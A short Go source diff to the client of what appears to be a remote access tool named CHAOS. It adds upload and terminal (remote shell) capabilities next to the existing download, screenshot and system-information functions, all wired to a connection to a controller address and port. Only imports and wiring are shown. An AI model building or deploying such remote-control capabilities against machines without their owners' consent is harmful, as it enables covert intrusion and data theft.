@@ -8,6 +8,8 @@ import (
 	"github.com/tiagorlampert/CHAOS/client/app/usecase/download"
 	"github.com/tiagorlampert/CHAOS/client/app/usecase/information"
 	"github.com/tiagorlampert/CHAOS/client/app/usecase/screenshot"
+	"github.com/tiagorlampert/CHAOS/client/app/usecase/terminal"
+	"github.com/tiagorlampert/CHAOS/client/app/usecase/upload"
 	"github.com/tiagorlampert/CHAOS/client/app/util/network"
 )
 
@@ -20,14 +22,18 @@ func NewApp(address, port string) *App {
 	conn := network.NewConnection(address, port)
 
 	// Use Case
-	downloadUseCase := download.NewDownloadUseCase(conn)
-	screenshotUseCase := screenshot.NewScreenshotUseCase(conn)
 	informationUseCase := information.NewInformationUseCase(conn)
+	screenshotUseCase := screenshot.NewScreenshotUseCase(conn)
+	downloadUseCase := download.NewDownloadUseCase(conn)
+	uploadUseCase := upload.NewUploadUseCase(conn)
+	terminalUseCase := terminal.NewTerminalUseCase(conn)
 
 	useCase := usecase.UseCase{
-		Download:    downloadUseCase,
-		Screenshot:  screenshotUseCase,
 		Information: informationUseCase,
+		Screenshot:  screenshotUseCase,
+		Download:    downloadUseCase,
+		Upload:      uploadUseCase,
+		Terminal:    terminalUseCase,
 	}
 
 	connectionHandler := connection.NewConnectionHandler(conn, &useCase)
